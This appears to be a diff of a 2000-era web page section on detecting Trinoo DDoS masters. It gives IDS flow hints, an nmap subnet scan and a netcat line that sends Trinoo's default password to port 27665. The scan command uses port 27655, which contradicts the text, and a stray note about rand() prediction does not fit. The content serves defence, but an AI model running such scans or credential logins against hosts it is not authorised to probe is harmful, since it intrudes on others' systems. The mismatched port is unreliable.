+IDS detecting the trinoo server:
+1. Look for flows with protocol type 17 (UDP)
+2. TCP connections (protocol type 6) to destination port 27665 (the trinoo
+server)
+
+Detecting the Trinoo server of your network:
+1. The server password hasn't changed (to the best of the authors
+knowledge), nor has the port it listens to.  Trinoo possible masters can
+be detected by using a tool like nmap to find hosts listening to port
+27665, i.e.
+	nmap -PI -sT -p 27655 -m logfile "you.subnet.*.*"
+After a list of possible servers has been compiled, automated login can be
+used for positive identification.  If you wish to script the automated
+login, try netcat (nc on most systems), i.e.
+	echo "betaalmostdone" | nc &lt;IP> 27665
+
+NOTE:
+Your mileage may vary with the random number prediction since it's very
+host specific - what does rand() really return?  Consult your
+documentation.
+
+<!-- internet searching strategies and hints content, end -->
+<hr width=66%><center><a href="ideale.htm"><IMG SRC="images/basipet.jpg"
+ALT="To ideale"
+ALIGN=BOTTOM WIDTH="118" HEIGHT="68" BORDER=0 VSPACE=0
+HSPACE=0></a>
+<br><br> 
+<!-- how to search the web, by fravia+, signet begin -->
+<table><tR><td width="300" height="2" bgcolor="#993300"></tD></tR></table>
+
+(c) 2000: <font color=blue>[</font><a href="info.htm">fravia+</a><font color=blue><font color=blue>]</fonT></font>, all rights reserved 
+<bR><!-- how to search the web, by fravia+, signet end -->
+
+
+<!-- begin da closing bit, duh -->
+
+
+<!-- begin da closing bit, duh -->
+</CENTER>
+</body>
+</HTML>
